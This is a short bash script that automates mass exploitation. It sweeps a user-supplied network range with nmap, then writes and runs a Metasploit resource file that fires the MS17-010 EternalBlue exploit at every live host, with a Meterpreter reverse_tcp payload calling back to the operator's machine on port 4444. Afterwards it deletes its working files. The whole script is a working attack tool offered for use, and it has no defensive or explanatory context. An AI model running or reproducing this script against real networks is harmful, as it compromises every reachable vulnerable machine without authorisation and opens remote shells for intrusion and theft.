#!/bin/bash

# Automate MS17-010 (EternalBlue) against multiple targets from Nmap ping sweep

echo "Enter network range for initial discovery (e.g., 192.168.1.0/24):"
read network

echo "Scanning for live hosts..."
nmap -sn "$network" -oG live_hosts.txt

grep "Up" live_hosts.txt | cut -d " " -f 2 > targets.txt

LHOST=$(ip route get 1 | awk '{print $7}' | head -1)
LPORT=4444
EXPLOIT="exploit/windows/smb/ms17_010_eternalblue"
PAYLOAD="windows/x64/meterpreter/reverse_tcp"

cat << EOF > /tmp/msf_multi.rc
use $EXPLOIT
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD $PAYLOAD
set ExitOnSession false
set AutoRunScript multi_handler
EOF

for ip in $(cat targets.txt); do
    echo "set RHOSTS $ip" >> /tmp/msf_multi.rc
    echo "exploit -j -z" >> /tmp/msf_multi.rc
done

echo "back" >> /tmp/msf_multi.rc
echo "sessions -l" >> /tmp/msf_multi.rc

echo "Launching Metasploit against $(wc -l < targets.txt) targets..."
msfconsole -q -r /tmp/msf_multi.rc

rm live_hosts.txt targets.txt /tmp/msf_multi.rc
